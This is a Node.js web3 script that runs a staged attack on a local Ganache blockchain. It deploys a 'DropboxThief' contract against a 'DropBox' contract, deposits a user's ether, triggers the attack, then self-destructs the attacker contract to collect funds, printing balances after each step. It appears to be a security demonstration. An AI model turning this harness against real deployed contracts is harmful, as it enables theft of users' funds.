var http = require('http');
var Web3 = require('web3');
var fs = require('fs');

var nodeUrl = "http://127.0.0.1:7545"; // connected blockchain : local Ganache
var dropboxContractAddress = "0x8bfc09fba97c87b7e9ccb454768024303e3621a5"; // Dropbox contract address on connected blockchain
var attackerContractAddress = null; // Malicious contract address, will be deployed and killed

var contractAccount = "0xcfB2619435A6641b2F18Ad4894B29bCd7390EAcA"; // contract owner address
var userAccount = "0xBF5498d96dB4DDa71b54e7f9D288E73BDf5a5E47"; // regular user address
var attackerAccount = "0xD04EabD4Ba1d8C655B3f95A24e89CaBbfFe0af33"; // malicious user address

var dropbox;
var attacker;

async function connection() {

	console.log("\n--- Connection ---");

	// use provider to connect to blockchain node
	if (typeof web3 !== 'undefined') {
		console.log('Use current provider');
		web3 = new Web3(web3.currentProvider);
	} else {
		console.log('Use http provider');
		web3 = new Web3(new Web3.providers.HttpProvider(nodeUrl));
	}
}

function loadContract(abiFile, contractAddress) {
	var parsed = JSON.parse(fs.readFileSync(abiFile));
	var contract = web3.eth.contract(parsed.abi);
	var methods = contract.at(contractAddress);
	console.log("Contract deployed : " + contractAddress);
	return methods;
}


async function initContracts() {
	console.log("\n--- Init contracts ---");
	dropbox = loadContract("../build/contracts/DropBox.json", dropboxContractAddress);
	//attacker = loadContract("build/contracts/DropboxThief.json", attackerContractAddress);
}

async function deployAttackerContract() {
	console.log("\n--- Init attacker contract ---");

	var parsed = JSON.parse(fs.readFileSync("../build/contracts/DropboxThief.json"));
	var bytecode = fs.readFileSync('dropboxthief-bytecode.json', 'utf8');
	var MyContract = web3.eth.contract(parsed.abi);

	var promiseContractCreation = new Promise(function(resolve, reject) {
		MyContract.new(
			dropboxContractAddress
			, { data: JSON.parse(bytecode).object, from: attackerAccount, gas: 4000000}
			, function (err, contract) {
				if (err) {
					console.log("Error on attacker contract deployment : "+err);
					reject(err);
				} else if (contract.address){
					console.log("Attacker contract deployed : "+contract.address);
					resolve(contract);
				}
			}
		);
	});

	attacker = await promiseContractCreation;
	attackerContractAddress = attacker.address;
}

function connectionInfo() {
	console.log("\n--- infos ---");
	// check if connected, and display some information about node
	console.log("Connected : "+web3.isConnected());
	//console.log("Web3 version : "+web3.version.api);
	//console.log("Block : "+web3.eth.blockNumber);
	//console.log("Coinbase : "+web3.eth.coinbase);
	console.log("Dropbox contract : "+dropboxContractAddress);
	console.log("Attacker contract : "+attackerContractAddress);
}



async function getReceipt(txHash) {
	console.log("Wait for receipt tx : "+txHash);
	var promiseReceipt = new Promise(function(resolve, reject){
		try {
			pollReceipt(txHash, resolve, reject);
		}
		catch(error){
			reject(error);
		}
	});

	try{
		receipt = await promiseReceipt;
		console.log("Get receipt : "+receipt);
		return receipt;
	}
	catch(error){
    	console.log(error);
    	return null;
    }
}

async function pollReceipt(txHash, resolve, reject) {
	try {
		//console.log("poll receipt");
		var receipt = web3.eth.getTransactionReceipt(txHash);
		if(receipt != null)
			resolve(receipt);
		else
			setTimeout(pollReceipt, 1000, txHash, resolve, reject);
	}
	catch(error){
		reject(error);
	}

}

async function sendEther(account, value) {
	console.log("\n--- Send Ether ---");

	// estimate gas
	var gas = dropbox.drop.estimateGas( { from: account, value: value, gas: 4000000 }	);
	//console.log("'Drop' estimate gas : "+gas);

	// drop ethers
	var txHash = dropbox.drop.sendTransaction({ from: account, value: value, gas: gas });
	var receipt = await getReceipt(txHash);
}

async function getEther(account) {
	console.log("\n--- Get Ether ---");

	try {
		// estimate gas
		var gas = dropbox.retrieve.estimateGas( { from: account, gas: 4000000 }	);
		//console.log("'Retreive' estimate gas : "+gas);

		// retrieve ethers
		var txHash = dropbox.retrieve.sendTransaction({ from: account, gas: gas });
		var receipt = await getReceipt(txHash);
	}
	catch(error) {
		console.log("ERROR : Unable to retrieve Ethers.");
		console.log(error);
	}
}

function contractBalance() {
	console.log("\n--- Balances ---");
	console.log("Contract balance : "+web3.fromWei(web3.eth.getBalance(dropboxContractAddress)));
	console.log("Attacker contract balance : "+web3.fromWei(web3.eth.getBalance(attackerContractAddress)));
	console.log("User balance : "+web3.fromWei(web3.eth.getBalance(userAccount)));
	console.log("Attacker balance : "+web3.fromWei(web3.eth.getBalance(attackerAccount)));
}

async function attack(value) {
	console.log("\n--- Attack ---");

	/*var gas = attacker.collect.estimateGas( { from: attackerAccount, gas: 400000 }	);
	console.log("'Collect' estimate gas : "+gas);
*/
	// start malicious contract
	var txHash = attacker.collect.sendTransaction({ from: attackerAccount, value: value, gas: 4000000 });
	var receipt = await getReceipt(txHash);
}

async function kill() {
    console.log("\n--- kill ---");

	var gas = attacker.kill.estimateGas( { from: attackerAccount, gas: 400000 }	);
	//console.log("'Kill' estimate gas : "+gas);

 	// attacker kills contract and get all ethers
 	var txHash = attacker.kill.sendTransaction({ from: attackerAccount, gas: gas });
	var receipt = await getReceipt(txHash);
}

async function run() {

	// connect and init
	await connection();
	await initContracts();
	await deployAttackerContract();
//	await connectionInfo();

	contractBalance();
	await sendEther(userAccount, web3.toWei("1", "ether"));
	contractBalance();
	await attack(web3.toWei("1", "ether"));
	contractBalance();
	await getEther(userAccount);
	contractBalance();
	await kill();
	contractBalance();
}

run();
